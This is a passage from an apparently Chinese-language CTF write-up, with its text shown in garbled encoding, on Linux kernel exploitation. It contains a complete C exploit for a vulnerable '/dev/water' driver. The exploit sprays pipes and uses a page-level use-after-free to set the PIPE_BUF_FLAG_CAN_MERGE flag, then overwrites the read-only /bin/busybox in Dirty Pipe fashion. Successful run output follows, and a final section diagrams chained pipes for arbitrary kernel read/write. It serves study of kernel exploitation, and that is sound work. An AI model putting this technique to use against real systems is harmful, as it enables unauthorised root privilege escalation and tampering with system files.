<p>kfree æ²¡æœ‰sizeå‚æ•°ï¼Ÿå…ˆæ‰¾page ç»“æ„ä½“ï¼Œä¸æ˜¯ slab page å°±é‡Šæ”¾ pageï¼Œæ˜¯slab page é‡Šæ”¾ object å¤§å°çš„å†…å®¹</p>
<h4 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe primitive"></a>pipe primitive</h4><p>dirty pipe ï¼Œå¤§è‡´å°±æ˜¯ <code>struct pipe_buffer</code> çš„ flag å­˜åœ¨ä¸€ä¸ªå±æ€§ï¼š <code>PIPE_BUF_FLAG_CAN_MERGE</code> ï¼Œç»“åˆ <code>splice</code> 0æ‹·è´ï¼Œå¯ä»¥å†™å…¥<strong>ä»»æ„å¯è¯»æ–‡ä»¶</strong>ã€‚</p>
<p>æˆ‘ä»¬ä¸»è¦æ€è·¯å°±æ˜¯ï¼šæ”¹pipeçš„flagï¼Œå®ç°ä¸ä¾èµ–åœ°å€çš„å†…æ ¸ææƒã€‚</p>
<p>åœ¨å†…æ ¸ææƒè¿‡ç¨‹ä¸­ï¼Œè¦†ç›– <code>/bin/busybox</code> æ–‡ä»¶ï¼Œå¯ä»¥å†™äºŒçº§åˆ¶shellcode æˆ–è€… bash è„šæœ¬ï¼Œéšä¾¿æ‰§è¡Œå‘½ä»¤å°±è¡Œï¼Œå› ä¸ºéƒ½æ˜¯ busybox çš„ linkã€‚</p>
<ul>
<li>é—®é¢˜ï¼šå¦‚æœshellå†™æˆ <code>/bin/cat /flag</code> ï¼Œå› ä¸ºæˆ‘ä»¬æ”¹äº†busyboxå®ç°ï¼Œä¼šå‡ºç° <code>Too many levels of symbolic links</code> çš„é”™è¯¯æç¤º</li>
<li>åˆ«å¿˜è®°å…³é—­æ–‡ä»¶æè¿°ç¬¦ğŸ¤£ã€‚</li>
<li>è¿˜æœ‰çš„é—®é¢˜å°±å†™åœ¨æ³¨é‡Šé‡Œäº†</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musl-gcc water.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="comment"> * strip exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_SPRAY_NUMS 80</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> target_file[] = <span class="string">&quot;/bin/busybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> payload[] = <span class="string">&quot;#!/tmp/sh\n /tmp/cat /flag\n&quot;</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;change ring_size make pipe-&gt;bufs kmalloc-512 &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;kmalloc-512 hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;write chunk data D&quot;</span>);</span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fill the hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_primitive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz;</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write pipe then we can read&quot;</span>);</span><br><span class="line">  <span class="comment">// ? å› ä¸ºæˆ‘ä»¬åœ¨find victim å†™äº† 3 ä¸ª å­—ç¬¦ä¸² å’Œ 3ä¸ª sizeof(int) å¯¼è‡´</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer, SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;free origin pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fcntl to set the pipe in victim page&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;failed to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(target_fd, &amp;offset, snd_pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) <span class="built_in">err_exit</span>(<span class="string">&quot;splice() error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ? è¿˜æ˜¯find victim_idx è¯»å–äº† tag å’Œ idx å¯¼è‡´çš„æŒ‡é’ˆåç§»</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer, SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;ops: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.ops);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info_pipe_buf.flags |= PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">  info_pipe_buf.offset = <span class="number">0</span>;</span><br><span class="line">  info_pipe_buf.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// æ³„éœ²ä¿¡æ¯çš„ä¸‹ä¸€ä¸ªpipe_buf</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;dirty pipe write target file&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(snd_pipe_fd[i][<span class="number">1</span>], payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write ook&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(target_fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buffer, <span class="string">&quot;/bin/sh&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;do not write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;/sbin/poweroff: %s&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/sh /tmp/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/cat /tmp/cat&quot;</span>);</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">pipe_primitive</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after dirty pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">check</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;if see this, write ok&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸç‡è›®é«˜çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Boot took 2.16 seconds</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+] spray pipe</span><br><span class="line">[+] change ring_size make pipe-&gt;bufs kmalloc-512</span><br><span class="line">[+] kmalloc-512 hole</span><br><span class="line">[+] new chunk <span class="keyword">then</span> free</span><br><span class="line">write chunk data D</span><br><span class="line"></span><br><span class="line">[+] fill the hole</span><br><span class="line">[+] alloc pipe_buffer pages</span><br><span class="line">[+] uaf change pipe-&gt;bufs-&gt;page</span><br><span class="line">[+] find victim pipe</span><br><span class="line">[+] succeed find victim: 0, origin: 1</span><br><span class="line">pause after uaf</span><br><span class="line"></span><br><span class="line">[+] write pipe <span class="keyword">then</span> we can <span class="built_in">read</span></span><br><span class="line">[+] free origin pipe</span><br><span class="line">[+] fcntl to <span class="built_in">set</span> the pipe <span class="keyword">in</span> victim page</span><br><span class="line">[+] page: 0xffffea0000193140</span><br><span class="line">[+] ops: 0xffffffff82248500</span><br><span class="line">debug</span><br><span class="line"></span><br><span class="line">[+] dirty pipe write target file</span><br><span class="line">[+] write ook</span><br><span class="line">pause after dirty pipe</span><br><span class="line"></span><br><span class="line">/sbin/poweroff: <span class="comment">#!/tmp/sh</span></span><br><span class="line"> /tmp/Ú€@<span class="keyword">if</span> see this, write ok</span><br><span class="line"></span><br><span class="line">[   14.466663] BUG: Bad page state <span class="keyword">in</span> process exp  pfn:07714</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br><span class="line">/bin/ls: line 3: syntax error: unexpected <span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="task-struct-cred"><a href="#task-struct-cred" class="headerlink" title="task struct cred"></a>task struct cred</h4><p>äºŒçº§ç®¡é“ï¼Œä»»æ„åœ°å€è¯»å†™ï¼Œä¹Ÿå¯ä»¥å†™ <code>modprobe_path</code>ã€‚</p>
<p>ä¸ºä»€ä¹ˆåˆšå¼€å§‹å†™pipeè¦å†™ä¸‰ä¸ªæ•°å­—ï¼šå› ä¸ºæˆ‘ä»¬è¦è‡³å°‘ä¸‰æ¬¡è¯»å–è·å¾—idxã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç¬¬äºŒæ¬¡page-level-uafï¼Œå€ŸåŠ©å¦å¤–ä¸‰ä¸ªç®¡é“ï¼š</p>
<ul>
<li>ä½ç½®åœ¨ç¬¬äºŒä¸ª uaf page ï¼š pipe1 &amp; pipe2 &amp; pipe3ï¼Œå…¶pageæŒ‡é’ˆå…¨éƒ½æŒ‡å‘ç¬¬äºŒä¸ª uaf page å¯¹åº”çš„ struct page ç»“æ„ä½“ã€‚</li>
<li>pipe1ï¼Œå®ç°ä»»æ„åœ°å€è¯»ï¼Œåªéœ€è¦ä¿®æ”¹pageæŒ‡é’ˆå’Œ offset + len å˜é‡</li>
<li>pipe2ï¼Œä¿®æ”¹pipe3 </li>
<li>pipe3ï¼Œå¯ä»¥ä¿®æ”¹pipe1 &amp; pipe 2 å†…å®¹</li>
<li>åªéœ€è¦æ§åˆ¶ pipe_buffer çš„ page æŒ‡é’ˆã€offset å’Œ len å°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">origin â€¾â€¾|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz +</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line">è¯»å–pipe_bufs2 è·å¾— info_pipe_buf,ç„¶åé€šè¿‡ victim å†™ pipe_bufs3ï¼Œè¿™é‡Œè¿™ä¸ªpage</span><br><span class="line">origin ï¿£|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾|</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  +   ...      +           |</span><br><span class="line">		  +------------+           |</span><br><span class="line">		  + pipe_bufsn + --------------&gt; page</span><br><span class="line">		  +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ‰¾åˆ°è¿™ä¸¤ä¸ªidx, ç„¶åæ„é€ äºŒçº§page-level-uafï¼Œä½¿ç”¨ pipe_bufs ä½¿ç”¨è¿™ä¸ª page</span><br><span class="line">origin ï¿£|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsx +</span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsy + </span><br><span class="line">		  +------------+</span><br><span class="line">		  + pipe_bufsz + snd_victimâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾|</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  +   ...      +                     |</span><br><span class="line">		  +------------+                     |</span><br><span class="line">		  + pipe_bufsn + snd_origin--------------&gt; uaf  page</span><br><span class="line">		  +------------+                          +------------+</span><br><span class="line">									              + pipe_bufs1 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs2 + </span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs3 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          + pipe_bufs4 +</span><br><span class="line">						                          +------------+</span><br><span class="line">						                          +     ...    +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snd_victim_idx å†™ 0, 1, 2, 3 ä¼ªé€ å¯¹åº”çš„ pipe_buffer page len offsetï¼Œéƒ½å¯ä»¥è¯»å†™pipe_bufs2</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆæƒ…å½¢</span><br><span class="line">4 å‘ 2 é‡Œé¢å†™å†…å®¹ï¼Œæ”¹å˜ page å’Œ offset å’Œ lenï¼Œå°±èƒ½ä»»æ„åœ°å€è¯»ã€‚</span><br><span class="line">4 å‘ 3 é‡Œå†™å†…å®¹ï¼Œä½¿ Y write å¼€å§‹åœ°å€ä¸º Z</span><br><span class="line">3 æ”¹ 4ï¼Œå¯ä»¥ä¸€ç›´å†™ X</span><br></pre></td></tr></table></figure>


